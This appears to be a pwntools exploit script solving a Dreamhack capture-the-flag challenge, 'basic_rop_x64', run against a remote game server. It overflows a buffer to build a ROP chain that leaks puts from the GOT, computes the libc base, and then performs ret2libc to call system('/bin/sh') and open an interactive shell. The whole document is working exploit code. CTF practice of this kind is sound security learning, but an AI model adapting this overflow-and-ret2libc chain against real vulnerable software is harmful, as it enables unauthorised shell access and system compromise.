from pwn import*

#p = process("./basic_rop_x64_patched")
p = remote('host3.dreamhack.games',9185)
#gdb.attach(p,api=True)

##########################
# STEP_1: Leak_libc_base #
##########################

ret = 0x00000000004005a9
rdi_ret = 0x0000000000400883

main = 0x00000000004007ba
puts_plt = 0x00000000004005c0
puts_got = 0x601018

payload = b"a"*0x48 + p64(ret) + p64(rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main)
p.sendline(payload)
p.recvuntil(b'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa')
libc_base = int.from_bytes(p.recv(6), "little") - 0x6f690
print('[+]Libc_base:',hex(libc_base))

####################
# STEP_2: ret2libc #
####################

system = 0x0000000000045390 + libc_base
binsh = 0x18cd57 + libc_base

payload = payload = b"a"*0x48 + p64(ret) + p64(rdi_ret) + p64(binsh) + p64(system) 
p.sendline(payload)
p.interactive()



